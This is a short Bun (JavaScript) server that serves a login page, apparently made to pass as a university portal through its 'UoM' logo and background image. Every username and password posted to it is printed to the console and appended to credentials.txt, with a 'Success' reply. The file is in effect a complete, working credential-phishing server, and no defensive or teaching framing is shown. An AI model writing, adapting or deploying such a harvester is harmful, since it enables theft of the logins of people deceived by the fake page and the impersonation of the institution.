import { serve, file, $} from "bun";

const server = serve({
  port: 3000,
  async fetch(req) {
    console.log("New Request\n");
    if (req.method === "POST") {
      const data = await req.formData();
      const username = data.get("username");
      const password = data.get("password");

      if (username && password) {
        console.log(`Username: ${username}, Password: ${password}`);
        Bun.write("credentials.txt", `${username}:${password}\n`, { append: true });
      }

      return new Response("Success");
    }
    if (req.url.includes("/assets/uom.png")) return new Response(file("./assets/UoM.png"));
    if (req.url.includes("/assets/background_image.jpg")) return new Response(file("./assets/background_image.jpg"));

    return new Response(file("./portal.html"));
  }
});

